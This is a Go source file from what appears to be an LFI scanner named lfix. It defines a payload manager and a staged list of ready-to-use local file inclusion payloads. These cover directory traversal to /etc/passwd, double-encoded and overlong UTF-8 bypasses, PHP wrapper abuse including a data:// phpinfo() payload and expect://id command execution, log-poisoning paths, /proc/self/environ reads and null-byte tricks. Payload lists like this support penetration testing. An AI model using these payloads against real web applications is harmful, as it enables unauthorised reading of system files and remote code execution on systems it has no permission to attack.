package core

import "github.com/Serdar715/lfix/pkg/bypass"

// OS represents the target operating system
type OS string

const (
	Linux   OS = "linux"
	Windows OS = "windows"
	All     OS = "all"
)

// Category represents payload category
type Category string

const (
	Traversal Category = "traversal"
	Encoding  Category = "encoding"
	Wrapper   Category = "wrapper"
	LogPoison Category = "log_poison"
	Procfs    Category = "procfs"
	NULLByte  Category = "nullbyte"
)

// Payload represents an LFI payload
type Payload struct {
	ID          string
	Category    Category
	Value       string
	Description string
	OS          []OS
	Encoding    bypass.EncodingType
	Stage       int // For smart mode: 1-4
}

// PayloadManager manages LFI payloads
type PayloadManager struct {
	categories map[Category][]*Payload
	custom     []*Payload
}

// DefaultPayloads returns the default LFI payloads
func DefaultPayloads() []*Payload {
	return []*Payload{
		// Stage 1: Simple Traversal
		{ID: "traversal_001", Category: Traversal, Value: "../../../etc/passwd", Description: "Basic traversal", OS: []OS{Linux}, Stage: 1},
		{ID: "traversal_002", Category: Traversal, Value: "../../etc/passwd", Description: "Simple traversal", OS: []OS{Linux}, Stage: 1},
		{ID: "traversal_003", Category: Traversal, Value: "../etc/passwd", Description: "Single level", OS: []OS{Linux}, Stage: 1},
		{ID: "traversal_004", Category: Traversal, Value: "....//....//etc/passwd", Description: "Double dot bypass", OS: []OS{Linux}, Stage: 1},
		{ID: "traversal_005", Category: Traversal, Value: "....\\\\....\\\\....\\\\etc\\\\passwd", Description: "Windows backslash", OS: []OS{Windows}, Stage: 1},
		{ID: "traversal_006", Category: Traversal, Value: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", Description: "Windows hosts", OS: []OS{Windows}, Stage: 1},

		// Stage 2: Encoded Traversal
		{ID: "encoding_001", Category: Encoding, Value: "%2e%2e%2f", Description: "URL encoded dots", OS: []OS{Linux}, Stage: 2},
		{ID: "encoding_002", Category: Encoding, Value: "%252e%252e%252f", Description: "Double URL encoded", OS: []OS{Linux}, Stage: 2},
		{ID: "encoding_003", Category: Encoding, Value: "%c0%af..%c0%af", Description: "Overlong UTF-8", OS: []OS{Linux}, Stage: 2},
		{ID: "encoding_004", Category: Encoding, Value: "..%c0%af", Description: "Single overlong", OS: []OS{Linux}, Stage: 2},
		{ID: "encoding_005", Category: Encoding, Value: "..%252f", Description: "Double encoded slash", OS: []OS{Linux}, Stage: 2},
		{ID: "encoding_006", Category: Encoding, Value: "..%5c", Description: "URL encoded backslash", OS: []OS{Windows}, Stage: 2},

		// Stage 3: Wrapper Abuse
		{ID: "wrapper_001", Category: Wrapper, Value: "php://filter/convert.base64-encode/resource=index.php", Description: "PHP filter base64", OS: []OS{Linux, Windows}, Stage: 3},
		{ID: "wrapper_002", Category: Wrapper, Value: "php://input", Description: "PHP input wrapper", OS: []OS{Linux, Windows}, Stage: 3},
		{ID: "wrapper_003", Category: Wrapper, Value: "data://text/plain,<?php phpinfo();?>", Description: "Data wrapper", OS: []OS{Linux, Windows}, Stage: 3},
		{ID: "wrapper_004", Category: Wrapper, Value: "expect://id", Description: "Expect wrapper", OS: []OS{Linux, Windows}, Stage: 3},
		{ID: "wrapper_005", Category: Wrapper, Value: "phar://./test.phar", Description: "Phar wrapper", OS: []OS{Linux, Windows}, Stage: 3},
		{ID: "wrapper_006", Category: Wrapper, Value: "zip://./test.zip#test", Description: "Zip wrapper", OS: []OS{Linux, Windows}, Stage: 3},

		// Stage 4: Log Poisoning
		{ID: "log_001", Category: LogPoison, Value: "/var/log/apache2/access.log", Description: "Apache access log", OS: []OS{Linux}, Stage: 4},
		{ID: "log_002", Category: LogPoison, Value: "/var/log/apache2/error.log", Description: "Apache error log", OS: []OS{Linux}, Stage: 4},
		{ID: "log_003", Category: LogPoison, Value: "/var/log/nginx/access.log", Description: "Nginx access log", OS: []OS{Linux}, Stage: 4},
		{ID: "log_004", Category: LogPoison, Value: "/var/log/httpd/access_log", Description: "HTTPd access log", OS: []OS{Linux}, Stage: 4},
		{ID: "log_005", Category: LogPoison, Value: "C:\\\\inetpub\\\\logs\\\\LogFiles\\\\W3SVC1\\\\access.log", Description: "IIS access log", OS: []OS{Windows}, Stage: 4},

		// Procfs
		{ID: "procfs_001", Category: Procfs, Value: "/proc/self/environ", Description: "Process environment", OS: []OS{Linux}, Stage: 3},
		{ID: "procfs_002", Category: Procfs, Value: "/proc/self/fd/0", Description: "File descriptor", OS: []OS{Linux}, Stage: 3},
		{ID: "procfs_003", Category: Procfs, Value: "/proc/version", Description: "Kernel version", OS: []OS{Linux}, Stage: 3},
		{ID: "procfs_004", Category: Procfs, Value: "/proc/cmdline", Description: "Kernel command line", OS: []OS{Linux}, Stage: 3},

		// Null Byte
		{ID: "nullbyte_001", Category: NULLByte, Value: "../../../etc/passwd%00", Description: "Null byte extension bypass", OS: []OS{Linux}, Stage: 2},
		{ID: "nullbyte_002", Category: NULLByte, Value: "../../etc/passwd%00.jpg", Description: "Null byte with extension", OS: []OS{Linux}, Stage: 2},
	}
}

// NewPayloadManager creates a new payload manager
func NewPayloadManager() *PayloadManager {
	pm := &PayloadManager{
		categories: make(map[Category][]*Payload),
		custom:     make([]*Payload, 0),
	}
	pm.initCategories()
	return pm
}

// initCategories initializes default payload categories
func (pm *PayloadManager) initCategories() {
	payloads := DefaultPayloads()
	for _, p := range payloads {
		pm.categories[p.Category] = append(pm.categories[p.Category], p)
	}
}

// GetByCategory returns payloads by category
func (pm *PayloadManager) GetByCategory(cat Category) []*Payload {
	return pm.categories[cat]
}

// GetByStage returns payloads by smart mode stage
func (pm *PayloadManager) GetByStage(stage int) []*Payload {
	result := make([]*Payload, 0)
	for _, payloads := range pm.categories {
		for _, p := range payloads {
			if p.Stage == stage {
				result = append(result, p)
			}
		}
	}
	return result
}

// GetByOS returns payloads filtered by OS
func (pm *PayloadManager) GetByOS(targetOS OS) []*Payload {
	result := make([]*Payload, 0)
	for _, payloads := range pm.categories {
		for _, p := range payloads {
			for _, os := range p.OS {
				if os == targetOS || os == All {
					result = append(result, p)
					break
				}
			}
		}
	}
	return result
}

// GetAll returns all payloads
func (pm *PayloadManager) GetAll() []*Payload {
	return DefaultPayloads()
}

// AddCustom adds a custom payload
func (pm *PayloadManager) AddCustom(p *Payload) {
	pm.custom = append(pm.custom, p)
	pm.categories[p.Category] = append(pm.categories[p.Category], p)
}

// GetTraversalPayloads returns all traversal payloads
func (pm *PayloadManager) GetTraversalPayloads() []*Payload {
	traversal := make([]*Payload, 0)

	// Add basic traversal
	traversal = append(traversal, &Payload{
		ID:          "traversal_001",
		Category:    Traversal,
		Value:       "../../../etc/passwd",
		Description: "Basic traversal",
		OS:          []OS{Linux},
	})

	// Add encoded versions
	em := bypass.NewEncodingManager()
	basic := "../../../etc/passwd"
	traversal = append(traversal, &Payload{
		ID:          "traversal_url_001",
		Category:    Traversal,
		Value:       em.Encode(basic, bypass.URLEncoding),
		Description: "URL encoded traversal",
		OS:          []OS{Linux},
	})

	traversal = append(traversal, &Payload{
		ID:          "traversal_double_001",
		Category:    Traversal,
		Value:       em.Encode(basic, bypass.DoubleURLEncoding),
		Description: "Double URL encoded traversal",
		OS:          []OS{Linux},
	})

	return traversal
}
